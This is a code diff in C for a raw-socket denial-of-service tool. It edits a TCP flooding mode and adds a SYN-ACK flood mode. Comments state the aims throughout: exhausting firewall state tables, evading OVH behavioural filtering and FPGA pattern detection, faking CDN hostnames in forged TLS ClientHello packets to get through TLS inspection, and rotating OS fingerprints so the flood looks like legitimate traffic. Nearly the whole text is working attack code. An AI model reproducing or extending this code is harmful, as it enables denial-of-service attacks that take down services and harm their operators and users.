+                            memset(th, 0, NF_TCP);
+                            th->source = htons(sport);
+                            th->dest = bin_target_port;
+                            th->seq = htonl(seq_n);
+                            th->ack_seq = htonl(ack_n);
+                            th->doff = 5;
+                            // Randomize TCP flags for diversity
+                            switch(fast_rand() % 4) {
+                                case 0: th->psh=1; th->ack=1; break; // PSH+ACK
+                                case 1: th->ack=1; break;            // ACK only
+                                case 2: th->syn=1; break;            // SYN
+                                default: th->psh=1; th->ack=1; th->urg=1; break; // PSH+ACK+URG
+                            }
+                            th->window = htons(win);
+                            // Random data after TCP header
+                            if(pl > NF_TCP) {
+                                int roff = fast_rand() % (FRAG_RBUF_SZ - (pl - NF_TCP));
+                                memcpy(payload + NF_TCP, rbuf + roff, pl - NF_TCP);
+                            }
+                        } else {
+                            // Non-first fragment: random payload (no TCP header visible)
+                            int roff = fast_rand() % (FRAG_RBUF_SZ - pl);
+                            memcpy(payload, rbuf + roff, pl);
                         }
-                        i += r_opt[i+1];
-                    }
-                    // Save server tsval for echoing in data packets
-                    slot_tsecr[b] = server_tsval;
 
-                    struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
-                    ih3->id=htons(++slot_ipid[b]);
-                    
-                    int ack_opt_len = 0;
-                    if (server_tsval != 0) {
-                        unsigned char *op3 = ack_buf+V17ETH+V17IP+20;
-                        op3[0]=1; op3[1]=1; // NOP NOP
-                        op3[2]=8; op3[3]=10; // Timestamps
-                        *((unsigned int*)(op3+4)) = htonl(slot_tsval[b]);
-                        *((unsigned int*)(op3+8)) = htonl(server_tsval); // echo server tsval
-                        slot_tsval[b] += 50 + (fast_rand() % 50); // realistic increment
-                        ack_opt_len = 12;
-                    }
-                    
-                    ih3->tot_len=htons(V17IP+20+ack_opt_len);
-                    struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
-                    th3->source=htons(slot_sp[b]);
-                    th3->seq=htonl(slot_seq[b]);
-                    th3->ack_seq=htonl(slot_ack[b]);
-                    th3->doff=(20+ack_opt_len)/4;
-                    // Window advertised = our receive window (not scaled)
-                    th3->window=htons(65535);
-                    
-                    ih3->check=0;
-                    unsigned int ic3=0;
-                    unsigned short *iw3 = (unsigned short*)ih3;
-                    for(int i=0; i<10; i++) ic3 += iw3[i];
-                    ic3 = (ic3>>16)+(ic3&0xFFFF); ic3 += (ic3>>16);
-                    ih3->check = (unsigned short)~ic3;
+                        // IP Checksum
+                        ih->check = 0;
+                        unsigned short *iw = (unsigned short*)ih;
+                        unsigned int ic = 0;
+                        for(int i=0; i<10; i++) ic += iw[i];
+                        ic = (ic>>16)+(ic&0xFFFF); ic += (ic>>16);
+                        ih->check = (unsigned short)~ic;
 
-                    th3->check=0;
-                    unsigned short *tw3 = (unsigned short*)th3;
-                    unsigned int cs3 = (src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20+ack_opt_len);
-                    for(int i=0; i<(20+ack_opt_len)/2; i++) cs3 += tw3[i]; 
-                    cs3 = (cs3>>16)+(cs3&0xFFFF); cs3 += (cs3>>16);
-                    th3->check = (unsigned short)~cs3;
-                    
-                    if(use_afp){
-                        sendto(fd_send,ack_buf,V17ETH+V17IP+20+ack_opt_len,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                    } else {
-                        sendto(fd_send,ack_buf+V17ETH,V17IP+20+ack_opt_len,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                    }
-                    slot_st[b]=ST_ESTABLISHED;
-                    slot_ch_sent[b]=0;
-                } // end SYN-ACK
-                else if(rth->ack && !rth->syn && !rth->rst && b >= 0 && slot_st[b]==ST_ESTABLISHED) {
-                    // === Fix 3: Server PSH+ACK (server sending data) — ACK it ===
-                    // Without this, OVH behavioral sees zombie connection and drops it
-                    int ihl = rih->ihl << 2;
-                    int tcphdr_len = rth->doff << 2;
-                    int data_len = (int)ntohs(rih->tot_len) - ihl - tcphdr_len;
-                    if(data_len > 0 && data_len < 65536) {
-                        slot_ack[b] += (unsigned int)data_len; // advance ACK by data received
-                        // Build bare ACK using ack_buf
-                        struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
-                        struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
-                        ih3->id=htons(++slot_ipid[b]);
-                        th3->source=htons(slot_sp[b]);
-                        th3->seq=htonl(slot_seq[b]);
-                        th3->ack_seq=htonl(slot_ack[b]);
-                        th3->doff=5; th3->ack=1; th3->psh=0;
-                        ih3->tot_len=htons(V17IP+20);
-                        ih3->check=0;
-                        unsigned short *iw3a=(unsigned short*)ih3;
-                        unsigned int ic3a=0; for(int i=0;i<10;i++) ic3a+=iw3a[i];
-                        ic3a=(ic3a>>16)+(ic3a&0xFFFF); ic3a+=(ic3a>>16);
-                        ih3->check=(unsigned short)~ic3a;
-                        th3->check=0;
-                        unsigned short *tw3a=(unsigned short*)th3;
-                        unsigned int cs3a=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20);
-                        for(int i=0;i<10;i++) cs3a+=tw3a[i];
-                        cs3a=(cs3a>>16)+(cs3a&0xFFFF); cs3a+=(cs3a>>16);
-                        th3->check=(unsigned short)~cs3a;
-                        if(use_afp) sendto(fd_send,ack_buf,V17ETH+V17IP+20,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
-                        else        sendto(fd_send,ack_buf+V17ETH,V17IP+20,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
-                    }
-                } // end server data ACK
-            } // end recv loop
-            struct mmsghdr vmsg_active[V17B];
-            int valid_pkts = 0;
-            
-            for(int b=0;b<V17B;b++){
-                // Blast on ESTABLISHED or FORCE_EST fallback
-                if(slot_st[b] != ST_ESTABLISHED && slot_st[b] != ST_FORCE_EST){
-                    if(slot_syn_sent[b] >= SYN_MAX_RETRY && slot_syn_sent[b] > 0) {
-                        // Fallback: target FW dropped SYN — blast anyway (stateless path)
-                        // Use seq+1 as ack (better than pure random for some stateless FWs)
-                        slot_st[b] = ST_FORCE_EST;
-                        slot_ack[b] = slot_seq[b] + 1;
-                    } else {
-                        continue;
+                        int frame_len;
+                        if(use_afp) {
+                            frame_len = NF_ETH + NF_IP + pl;
+                            fiov[npkt].iov_base = pkt;
+                        } else {
+                            frame_len = NF_IP + pl;
+                            fiov[npkt].iov_base = pkt + NF_ETH;
+                        }
+                        fiov[npkt].iov_len = frame_len;
+                        fmsg[npkt].msg_hdr.msg_iov = &fiov[npkt];
+                        fmsg[npkt].msg_hdr.msg_iovlen = 1;
+                        fmsg[npkt].msg_hdr.msg_name = use_afp ? (void*)&nf_sll : (void*)&nf_raw;
+                        fmsg[npkt].msg_hdr.msg_namelen = use_afp ? sizeof(nf_sll) : sizeof(nf_raw);
+                        npkt++;
                     }
                 }
-                unsigned char *fr=vbuf[b];
-                struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
-                struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
-                unsigned short *tw=(unsigned short*)th;
 
-                unsigned int current_pl;
-                unsigned short flags;
-
-                slot_rn[b]++;
-
-                // === TLS ClientHello: send ONCE per connection after 3WHS ===
-                if (args.is_v18_tls && slot_st[b] == ST_ESTABLISHED && !slot_ch_sent[b]) {
-                    unsigned char ch_buf[512];
-                    memset(ch_buf, 0, sizeof(ch_buf));
-                    if(use_afp){memcpy(ch_buf,gw_mac,6);memcpy(ch_buf+6,src_mac,6);ch_buf[12]=8;ch_buf[13]=0;}
-                    
-                    // Build TLS 1.2 ClientHello payload
-                    unsigned char ch_payload[256];
-                    int cp = 0;
-                    ch_payload[cp++] = 0x16; // Handshake
-                    ch_payload[cp++] = 0x03; ch_payload[cp++] = 0x01; // TLS 1.0 compat
-                    int rec_len_pos = cp; cp += 2; // record length placeholder
-                    ch_payload[cp++] = 0x01; // ClientHello type
-                    int hs_len_pos = cp; cp += 3; // handshake length placeholder
-                    ch_payload[cp++] = 0x03; ch_payload[cp++] = 0x03; // TLS 1.2
-                    for(int i=0;i<32;i++) ch_payload[cp++] = fast_rand() & 0xFF; // Client Random
-                    ch_payload[cp++] = 32; // Session ID length
-                    for(int i=0;i<32;i++) ch_payload[cp++] = fast_rand() & 0xFF; // Session ID
-                    // Cipher Suites (Chrome-like)
-                    unsigned short ciphers[] = {0x1301,0x1302,0x1303,0xc02c,0xc02b,0xc030,0xc02f,0xcca9,0xcca8,0x00ff};
-                    int n_ciphers = sizeof(ciphers)/sizeof(ciphers[0]);
-                    ch_payload[cp++] = (n_ciphers*2) >> 8; ch_payload[cp++] = (n_ciphers*2) & 0xFF;
-                    for(int i=0;i<n_ciphers;i++){ch_payload[cp++]=ciphers[i]>>8;ch_payload[cp++]=ciphers[i]&0xFF;}
-                    ch_payload[cp++] = 1; ch_payload[cp++] = 0; // Compression: null
-                    // Extensions
-                    int ext_len_pos = cp; cp += 2;
-                    int ext_start = cp;
-                    // SNI extension — use real-looking CDN/cloud hostnames to pass TLS inspection
-                    static const char *sni_pool[] = {
-                        "cloudflare.com","akamai.net","fastly.net","cdn77.com",
-                        "google.com","amazonaws.com","azure.microsoft.com","github.com",
-                        "cloudfront.net","edgecastcdn.net","stackpath.net","maxcdn.com"
-                    };
-                    const char *sni_host = sni_pool[fast_rand() % 12];
-                    int sni_len = (int)strlen(sni_host);
-                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x00; // extension type: server_name
-                    int sni_ext_len = sni_len + 5;
-                    ch_payload[cp++]=(sni_ext_len)>>8;ch_payload[cp++]=(sni_ext_len)&0xFF;
-                    ch_payload[cp++]=(sni_ext_len-2)>>8;ch_payload[cp++]=(sni_ext_len-2)&0xFF;
-                    ch_payload[cp++]=0x00; // host_name type
-                    ch_payload[cp++]=sni_len>>8;ch_payload[cp++]=sni_len&0xFF;
-                    memcpy(ch_payload+cp, sni_host, sni_len); cp += sni_len;
-                    // supported_versions extension
-                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x2b;
-                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x05;
-                    ch_payload[cp++]=0x04;
-                    ch_payload[cp++]=0x03;ch_payload[cp++]=0x04; // TLS 1.3
-                    ch_payload[cp++]=0x03;ch_payload[cp++]=0x03; // TLS 1.2
-                    // Fill lengths
-                    int ext_total = cp - ext_start;
-                    ch_payload[ext_len_pos] = ext_total >> 8; ch_payload[ext_len_pos+1] = ext_total & 0xFF;
-                    int hs_len = cp - hs_len_pos - 3;
-                    ch_payload[hs_len_pos] = (hs_len >> 16) & 0xFF;
-                    ch_payload[hs_len_pos+1] = (hs_len >> 8) & 0xFF;
-                    ch_payload[hs_len_pos+2] = hs_len & 0xFF;
-                    int rec_len = cp - rec_len_pos - 2;
-                    ch_payload[rec_len_pos] = rec_len >> 8; ch_payload[rec_len_pos+1] = rec_len & 0xFF;
-                    
-                    // IP + TCP headers for ClientHello packet
-                    struct iphdr *cih=(struct iphdr*)(ch_buf+V17ETH);
-                    cih->ihl=5;cih->version=4;
-                    cih->tot_len=htons(V17IP+V17TCP+cp);
-                    cih->frag_off=htons(0x4000);cih->ttl=slot_ttl[b];cih->protocol=IPPROTO_TCP;
-                    cih->saddr=src_ip;cih->daddr=bin_target_ip;
-                    cih->id=htons(++slot_ipid[b]);
-                    
-                    struct tcphdr *cth=(struct tcphdr*)(ch_buf+V17ETH+V17IP);
-                    memset(cth,0,V17TCP);
-                    cth->source=htons(slot_sp[b]);cth->dest=bin_target_port;
-                    cth->seq=htonl(slot_seq[b]);cth->ack_seq=htonl(slot_ack[b]);
-                    cth->doff=5;cth->psh=1;cth->ack=1;
-                    cth->window=htons(slot_win[b]);
-                    // Copy ClientHello payload
-                    memcpy(ch_buf+V17ETH+V17IP+V17TCP, ch_payload, cp);
-                    
-                    // IP checksum
-                    cih->check=0;
-                    unsigned short *ciw=(unsigned short*)cih;
-                    unsigned int cic=0;
-                    for(int i=0;i<10;i++) cic+=ciw[i];
-                    cic=(cic>>16)+(cic&0xFFFF);cic+=(cic>>16);
-                    cih->check=(unsigned short)~cic;
-                    // TCP checksum
-                    cth->check=0;
-                    unsigned short *ctw=(unsigned short*)cth;
-                    unsigned int ccs=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(V17TCP+cp);
-                    for(int i=0;i<(V17TCP+cp)/2;i++) ccs+=ctw[i];
-                    if((V17TCP+cp)%2) ccs+=htons(((unsigned short)((unsigned char*)cth)[V17TCP+cp-1])<<8);
-                    ccs=(ccs>>16)+(ccs&0xFFFF);ccs+=(ccs>>16);
-                    cth->check=(unsigned short)~ccs;
-                    
-                    if(use_afp){
-                        sendto(fd_send,ch_buf,V17ETH+V17IP+V17TCP+cp,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
+                // Burst send via dual sockets — toggle on ENOBUFS for max throughput
+                int cur_fd = fd_send;
+                unsigned long long tsent = 0, tbytes = 0;
+                for(int burst=0; burst<256; burst++) {
+                    int sent = sendmmsg(cur_fd, fmsg, npkt, 0);
+                    if(sent > 0) {
+                        tsent += sent;
+                        for(int i=0; i<sent; i++) tbytes += fmsg[i].msg_hdr.msg_iov->iov_len;
                     } else {
-                        sendto(fd_send,ch_buf+V17ETH,V17IP+V17TCP+cp,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
+                        if(errno==ENOBUFS||errno==EAGAIN) {
+                            cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
+                            continue;
+                        }
+                        break;
                     }
-                    slot_seq[b] += cp;
-                    slot_ch_sent[b] = 1;
-                    thread_stats[tid].packets++;
-                    thread_stats[tid].bytes += V17ETH+V17IP+V17TCP+cp;
                 }
-
-                // Connection recycling — fast for state table exhaustion
-                // Long-lived connections: exhaust FW state table longer, avoid SYN flood signature
-                unsigned int churn_threshold = (args.port == 80 || args.port == 443) ? 
-                                                (20000 + (fast_rand() % 30000)) : (40000 + (fast_rand() % 60000));
-                
-                if(slot_rn[b] > churn_threshold) {
-                    // Mix of RST and FIN/ACK for state exhaustion
-                    if (fast_rand() % 2 == 0) {
-                        flags = (5<<12)|0x004; // RST
-                        th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
-                    } else {
-                        flags = (5<<12)|0x011; // FIN+ACK
-                        th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
-                    }
-                    current_pl = 0;
-                    tw[6] = htons(flags);
-                    
-                    unsigned int tot_tcp = V17TCP + current_pl;
-                    unsigned int tot_ip = V17IP + tot_tcp;
-                    ih->tot_len=htons(tot_ip);
-                    if(use_afp){ viov[b].iov_len = V17ETH + tot_ip; }
-                    else { viov[b].iov_len = tot_ip; }
-                    th->seq=htonl(slot_seq[b]);
-                    th->ack_seq=htonl(slot_ack[b]);
-                    th->source=htons(slot_sp[b]);
-                    
-                    // FIX: sequential IP ID + always DF
-                    ih->id=htons(++slot_ipid[b]);
-                    ih->frag_off=htons(0x4000);
-                    ih->check=0;
-                    unsigned short *iw2=(unsigned short*)ih;
-                    unsigned int ic=iw2[0]+iw2[3]+htons((unsigned int)(ih->ttl<<8|IPPROTO_TCP))+iw2[6]+iw2[7]+iw2[8]+iw2[9];
-                    ic+=htons(tot_ip)+ih->id;
-                    ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
-                    ih->check=(unsigned short)~ic;
-                    th->check=0;
-                    unsigned int cs=tcp_base[b]+tw[0]+tw[2]+tw[3]+tw[4]+tw[5]+tw[7];
-                    cs += htons(tot_tcp); cs += tw[6];
-                    cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
-                    th->check=(unsigned short)~cs;
-                    
-                    vmsg_active[valid_pkts] = vmsg[b];
-                    valid_pkts++;
-                    
-                    // Reset slot for new connection
-                    slot_st[b] = ST_SYN_SENT;
-                    slot_rn[b] = 0;
-                    slot_syn_sent[b] = 0;
-                    slot_seq[b] = fast_rand();
-                    slot_ack[b] = 0; // reset: don't use stale ack
-                    port_to_slot[slot_sp[b]] = -1;
-                    unsigned short p2;
-                    do { p2 = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p2] != -1);
-                    slot_sp[b] = p2;
-                    port_to_slot[p2] = b;
-                    slot_ch_sent[b] = 0;
-                    
-                    // New OS fingerprint per connection
-                    slot_ttl[b] = ttl_t[fast_rand()%ttl_sz];
-                    slot_win[b] = win_t[fast_rand()%win_sz];
-                    slot_ipid[b] = fast_rand() & 0xFFFF; // New sequential IP ID base
-                    slot_tsval[b] = fast_rand(); slot_tsecr[b] = 0; slot_wscale[b] = 0;
-                    continue;
-                }
-
-                // Raw data blast
-                unsigned int pl_sum_ch = 0;
-                slot_ch_sent[b] = 1;
-
-                // 1. TCP Flags Randomization (80% ACK, 20% PSH+ACK)
-                unsigned short r_flag = fast_rand() % 100;
-                if(r_flag < 80) {
-                    flags = (5<<12)|0x010; // ACK only
-                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                } else {
-                    flags = (5<<12)|0x018; // PSH+ACK
-                    th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                }
-                
-                    // Fix 4: Variable payload size 64-1400 (defeats FPGA constant-size pattern)
-                    unsigned int raw_pl = 64 + (fast_rand() % 1337);
-                    if(raw_pl & 1) raw_pl++;
-                    current_pl = raw_pl;
-                    tw[6] = htons(flags);
-
-                    unsigned char *pl = fr + V17ETH + V17IP + V17TCP;
-
-                    // Fix 1: Pure L4 — no TLS overhead, rotate through L4 protocol prefixes only
-                    // HTTP GET, HTTP/2 preface, SSH probe, raw binary, SMTP EHLO
-                    static const struct { unsigned char data[16]; int len; } proto_prefix[] = {
-                        // HTTP/1.1 GET
-                        {{0x47,0x45,0x54,0x20,0x2f,0x20,0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x0d,0x0a}, 16},
-                        // HTTP/1.1 POST
-                        {{0x50,0x4f,0x53,0x54,0x20,0x2f,0x20,0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x0d}, 16},
-                        // SSH-2.0 probe
-                        {{0x53,0x53,0x48,0x2d,0x32,0x2e,0x30,0x2d,0x4f,0x70,0x65,0x6e,0x53,0x53,0x48,0x5f}, 16},
-                        // SMTP EHLO
-                        {{0x45,0x48,0x4c,0x4f,0x20,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x0d,0x0a}, 16},
-                        // Raw binary (no prefix)
-                        {{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 0},
-                        // Raw binary 2
-                        {{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 0},
-                        // FTP USER
-                        {{0x55,0x53,0x45,0x52,0x20,0x61,0x6e,0x6f,0x6e,0x79,0x6d,0x6f,0x75,0x73,0x0d,0x0a}, 16},
-                        // HTTP/2 preface
-                        {{0x50,0x52,0x49,0x20,0x2a,0x20,0x48,0x54,0x54,0x50,0x2f,0x32,0x2e,0x30,0x0d,0x0a}, 16},
-                    };
-                    int pp_idx = (int)(fast_rand() % 8);
-                    int pp_len = proto_prefix[pp_idx].len;
-                    if(pp_len > 0) memcpy(pl, proto_prefix[pp_idx].data, pp_len);
-                    if(current_pl > (unsigned int)pp_len) {
-                        unsigned int random_len = current_pl - pp_len;
-                        unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - random_len)) & ~1;
-                        memcpy(pl + pp_len, huge_pl_buf + pl_offset, random_len);
-                        unsigned int pl_sum_bp = 0;
-                        for(int pi=0;pi<pp_len/2;pi++) pl_sum_bp+=((unsigned short*)proto_prefix[pp_idx].data)[pi];
-                        unsigned int random_sum = huge_pl_sum[(pl_offset+random_len)/2] - huge_pl_sum[pl_offset/2];
-                        pl_sum_ch = pl_sum_bp + random_sum;
-                    } else {
-                        pl_sum_ch = 0;
-                    }
-
-                { // Common send path
-                unsigned int tot_tcp = V17TCP + current_pl;
-                unsigned int tot_ip = V17IP + tot_tcp;
-
-                // Update TCP Timestamp option in-place (tsval monotone, tsecr from SYN-ACK)
-                unsigned int *tsval_ptr = (unsigned int *)(fr + V17ETH + V17IP + 20 + 4);
-                unsigned int *tsecr_ptr = (unsigned int *)(fr + V17ETH + V17IP + 20 + 8);
-                // Fix 5: Realistic tsval increment — kernel 250Hz = +1 per 4ms
-                // At ~Mpps, this fires ~1000x/s, so increment by 1-4 to simulate ~250-1000Hz
-                slot_tsval[b] += 1 + (fast_rand() % 4);
-                *tsval_ptr = htonl(slot_tsval[b]);
-                *tsecr_ptr = htonl(slot_tsecr[b]);
-                // TS variable words checksum contribution
-                unsigned short *ts_sw = (unsigned short *)(fr + V17ETH + V17IP + 20 + 4);
-                unsigned int ts_sum = (unsigned int)ts_sw[0] + ts_sw[1] + ts_sw[2] + ts_sw[3];
-
-                slot_seq[b] += current_pl;
-                th->seq=htonl(slot_seq[b]);
-                th->ack_seq=htonl(slot_ack[b]);
-                th->source=htons(slot_sp[b]);
-                th->window=htons(slot_win[b]);
-
-                ih->tot_len=htons(tot_ip);
-                if(use_afp){ viov[b].iov_len = V17ETH + tot_ip; }
-                else { viov[b].iov_len = tot_ip; }
-
-                ih->ttl = slot_ttl[b];
-                unsigned int newttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
-                unsigned short *iw2=(unsigned short*)ih;
-
-                // FIX: Sequential IP ID (not random) + always DF
-                ih->id=htons(++slot_ipid[b]);
-                ih->frag_off=htons(0x4000);
-                ih->check=0;
-                unsigned int ic=iw2[0]+iw2[3]+htons(newttlproto)+iw2[6]+iw2[7]+iw2[8]+iw2[9];
-                ic+=htons(tot_ip)+ih->id;
-                ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
-                ih->check=(unsigned short)~ic;
-
-                th->check=0;
-                // tcp_base already has: src_ip + dst_ip + proto + dport + NOP+NOP + TS-kind+len
-                // tw[0]=sport tw[2..5]=seq/ack tw[6]=flags tw[7]=window
-                unsigned int cs=tcp_base[b]+tw[0]+tw[2]+tw[3]+tw[4]+tw[5]+tw[7];
-                cs += htons(tot_tcp);
-                cs += tw[6];
-                cs += ts_sum;   // tsval + tsecr (variable)
-                cs += pl_sum_ch;
-                cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
-                th->check=(unsigned short)~cs;
-
-                vmsg_active[valid_pkts] = vmsg[b];
-                valid_pkts++;
-                } // end common send block
+                thread_stats[tid].packets     += tsent;
+                thread_stats[tid].tcp_packets += tsent;
+                thread_stats[tid].raw_sent    += tsent;
+                thread_stats[tid].bytes       += tbytes;
             }
-            
-            if(valid_pkts == 0){
-                continue; // No sleep — spin fast to catch SYN-ACKs for instant shock
-            }
-            
-            // REMOVED: usleep(250) was artificially limiting PPS to ~1M/thread
-            // Adaptive backoff via ENOBUFS handler at line 1943 is sufficient
-
-            if(round==1){
-                LOG_INFO("T%d: hot loop done, calling sendmmsg valid_pkts=%d",tid,valid_pkts);
-                fflush(stdout);
-            }
-            // 128x burst, dual socket, skip checksum between bursts
-            int cur_fd = fd_send;
-            unsigned long long total_sent = 0, total_bytes = 0;
-            for(int burst = 0; burst < 256; burst++) {
-                int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
-                if(sent>0){
-                    total_sent += sent;
-                    for(int i=0; i<sent; i++) total_bytes += vmsg_active[i].msg_hdr.msg_iov->iov_len;
-                } else {
-                    if(errno==ENOBUFS||errno==EAGAIN){
-                        // Toggle socket immediately, no sleep — keep burst rate max
-                        cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
-                        continue;
-                    }
-                    else break;
-                }
-                
-                // Update seq/checksum for the NEXT burst to avoid duplicate sequence numbers
-                for(int i = 0; i < valid_pkts; i++) {
-                    struct iphdr *bih;
-                    struct tcphdr *bth;
-                    unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
-                    unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
-                    unsigned int new_seq;
-                    unsigned short new_seq_hi, new_seq_lo;
-                    unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
-
-                    if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
-                    else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
-                    
-                    old_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    old_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    old_ipid = bih->id;
-                    old_ip_check = bih->check;
-                    old_tcp_check = bth->check;
-                    
-                    // Add payload size to seq
-                    unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
-                    new_seq = ntohl(bth->seq) + p_len;
-                    bth->seq = htonl(new_seq);
-                    
-                    // Increment IP ID
-                    bih->id = htons(ntohs(bih->id) + 1);
-                    
-                    new_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    new_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    
-                    ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
-                    ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
-                    ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
-                    bih->check = (unsigned short)~ip_ck;
-                    
-                    tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
-                                          + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
-                    tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
-                    tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
-                    bth->check = (unsigned short)~tcp_ck;
-                }
-            }
-            thread_stats[tid].packets     += total_sent;
-            thread_stats[tid].tcp_packets += total_sent;
-            thread_stats[tid].raw_sent    += total_sent;
-            thread_stats[tid].bytes       += total_bytes;
+            free(fbuf); free(fmsg); free(fiov); free(rbuf);
         }
 
-        free(vbuf);free(vmsg);free(viov);free(tcp_base);free(ip_base);
+        // ================================================================
+        // SYN-ACK FLOOD
+        // ================================================================
+        else if (args.is_synack_flood) {
+            // Strategy: Send perfect SYN-ACK packets with realistic OS fingerprints
+            //   - Target must lookup connection state for every SYN-ACK (CPU exhaustion)
+            //   - Many FWs allow SYN-ACK through (it's a "response" packet, not "initiating")
+            //   - Stateful FW bypass: SYN-ACK from "outside" looks like legitimate server response
+            //   - OS fingerprint rotation: TTL, Window, MSS, WScale, Timestamps vary per packet
+            //   - Per-burst incremental checksum update for maximum PPS
 
-        free(slot_seq);free(slot_ack);free(slot_sp);free(slot_st);free(slot_rn);
-        free(slot_ttl);free(slot_win);free(slot_syn_sent);
-        free(slot_tls_ver);free(slot_ch_sent);free(slot_tsval);
-        free(slot_tsecr);free(slot_wscale);
-        free(slot_pl_sum);free(slot_ipid);
-        free(huge_pl_buf);free(huge_pl_sum);free(port_to_slot);
-        free(recv_buf);free(syn_buf);free(ack_buf);
-        close(fd_send);close(fd_send2);close(fd_recv);
+            // TCP options layout (20 bytes total):
+            //   MSS(4) + SACK_PERM(2) + Timestamps(10) + NOP(1) + WScale(3) = 20
+            #define SA_B 4096
+            #define SA_OPT 20
+            #define SA_TCPLEN (NF_TCP + SA_OPT)
+            #define SA_MAXPKT (NF_ETH + NF_IP + SA_TCPLEN)
+
+            LOG_INFO("T%d: SYNACK-FLOOD iface=%s %s batch=%d",
+                     tid, iface, use_afp?"AF_PACKET":"RAW", SA_B);
+            fflush(stdout);
+
+            unsigned char *sabuf = malloc((size_t)SA_B * SA_MAXPKT);
+            struct mmsghdr *smsg = calloc(SA_B, sizeof(struct mmsghdr));
+            struct iovec *siov = calloc(SA_B, sizeof(struct iovec));
+            if(!sabuf||!smsg||!siov){LOG_ERR("T%d: malloc fail",tid);return NULL;}
+
+            // Pre-build msg structures (iov_len and msg_name are constant)
+            for(int b=0; b<SA_B; b++) {
+                unsigned char *pkt = sabuf + (size_t)b * SA_MAXPKT;
+                if(use_afp) {
+                    siov[b].iov_base = pkt;
+                    siov[b].iov_len = SA_MAXPKT;
+                } else {
+                    siov[b].iov_base = pkt + NF_ETH;
+                    siov[b].iov_len = NF_IP + SA_TCPLEN;
+                }
+                smsg[b].msg_hdr.msg_iov = &siov[b];
+                smsg[b].msg_hdr.msg_iovlen = 1;
+                smsg[b].msg_hdr.msg_name = use_afp ? (void*)&nf_sll : (void*)&nf_raw;
+                smsg[b].msg_hdr.msg_namelen = use_afp ? sizeof(nf_sll) : sizeof(nf_raw);
+            }
+
+            // 8 OS fingerprint profiles for realistic SYN-ACK diversity
+            struct sa_profile {
+                unsigned short mss;
+                unsigned char wscale;
+                unsigned short window;
+                unsigned char ttl;
+            };
+            static const struct sa_profile sa_profiles[] = {
+                {1460, 8, 65535,  64},   // Linux 5.x/6.x
+                {1460, 7, 28960,  64},   // Linux 4.x
+                {1460, 8, 64240, 128},   // Windows 10/11
+                {1460, 6, 65535,  64},   // macOS Ventura+
+                {1400, 5, 32768,  64},   // FreeBSD 13+
+                {1360, 8, 29200,  64},   // Linux behind VPN/tunnel
+                {1452, 7, 14480, 128},   // Windows Server 2022
+                {1460, 9, 65535, 255},   // Cisco IOS XE
+            };
+            int sa_nprofiles = (int)(sizeof(sa_profiles)/sizeof(sa_profiles[0]));
+
+            // Timestamp base — realistic monotonic counter
